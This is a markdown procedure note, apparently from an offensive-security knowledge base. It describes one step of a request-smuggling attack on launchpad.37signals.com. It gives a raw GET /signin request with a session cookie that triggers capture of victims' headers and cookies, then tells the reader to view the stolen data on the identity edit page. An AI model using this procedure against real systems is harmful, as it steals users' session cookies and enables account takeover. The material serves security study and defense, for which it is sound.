---
tags:
  - simulation
  - data-exfiltration
type: procedure
tools:
  - '[[tools/Turbo-Intruder]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/get-signin-victim-trigger]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f7a063c0-aa41-4725-8253-9472d5b3b451
created_at: '2025-12-13T09:01:21.714Z'
updated_at: '2025-12-13T09:01:21.714Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Simulate Victims and View Captured Data

## Summary

This procedure simulates victim requests to trigger capture and then views the exfiltrated data on the edit page.

## Description

Send GET requests to /signin and refresh the identity edit page to see captured headers and cookies.

## Requirements

1. Prior capture desync sent
2. Turbo Intruder
3. Logged-in session

## Defense

Defensive measures and detection strategies:

- Monitor for repeated GET requests
- Audit identity edit page access

## Objectives

1. Trigger data capture
2. View exfiltrated information
3. Confirm successful theft

## Instructions

### Step 1: Send Victim Trigger Requests

**Context**: Simulate victims to hit the poisoned endpoint.

**Command** ([[commands/get-signin-victim-trigger]]):
```bash
GET /signin HTTP/1.1
Host: launchpad.37signals.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D
Foo: bar

```

> Send these to trigger capture; then refresh the edit page.

### Step 2: View Data

**Context**: Refresh https://launchpad.37signals.com/identity/edit.

> Manually check for captured headers and cookies.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/get-signin-victim-trigger]]

## Tools Used

- [[tools/Turbo-Intruder]]

## Tags

- [[simulation]]
- [[data-exfiltration]]
